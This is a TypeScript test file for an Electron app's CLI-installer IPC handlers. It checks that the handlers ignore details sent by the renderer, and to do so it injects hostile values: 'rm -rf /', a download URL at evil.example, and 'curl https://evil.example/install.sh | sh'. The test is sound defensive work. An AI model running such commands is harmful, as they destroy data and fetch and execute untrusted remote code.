import { describe, expect, it, vi } from 'vitest';
import { registerAxisCliShellIpc } from '../apps/desktop/src/electron/axisCliShell';

describe('Desktop Axis CLI shell IPC', () => {
  it('registers fixed actions that ignore renderer-provided command details', async () => {
    const handlers = new Map<string, (event: unknown, input?: unknown) => unknown>();
    const installedStatus = {
      kind: 'installed' as const,
      desktopVersion: '0.2.0',
      cliVersion: '0.2.0',
      managedPath: '/axis',
      resolvedPath: '/axis',
      onPath: true,
      skills: { kind: 'in_sync' as const, axisVersion: '0.2.0' }
    };
    const installer = {
      getStatus: vi.fn(async () => ({ kind: 'not_installed' as const, desktopVersion: '0.2.0', manualCommand: 'curl ...' })),
      install: vi.fn(async () => ({ ok: true, status: installedStatus })),
      update: vi.fn(async () => ({ ok: true, status: installedStatus })),
      repairPath: vi.fn(async () => ({ ok: true, status: installedStatus })),
      syncSkills: vi.fn(async () => ({ ok: true, status: { kind: 'in_sync' as const, axisVersion: '0.2.0' } })),
      getManualInstallCommand: vi.fn(async () => ({ platform: 'macos' as const, command: 'curl ... && axis skills sync' }))
    };

    registerAxisCliShellIpc({
      ipcMain: { handle: (channel: string, handler: (event: unknown, input?: unknown) => unknown) => { handlers.set(channel, handler); } },
      installer
    });

    await handlers.get('axis-shell:installAxisCli')?.({}, { url: 'https://evil.example/axis.zip', command: 'rm -rf /' });
    await handlers.get('axis-shell:restoreAxisCliSkills')?.({}, { force: false });
    await handlers.get('axis-shell:getAxisCliManualInstallCommand')?.({}, { command: 'curl https://evil.example/install.sh | sh' });

    expect(installer.install).toHaveBeenCalledWith();
    expect(installer.syncSkills).toHaveBeenCalledWith(true);
    expect(installer.getManualInstallCommand).toHaveBeenCalledWith();
  });
});
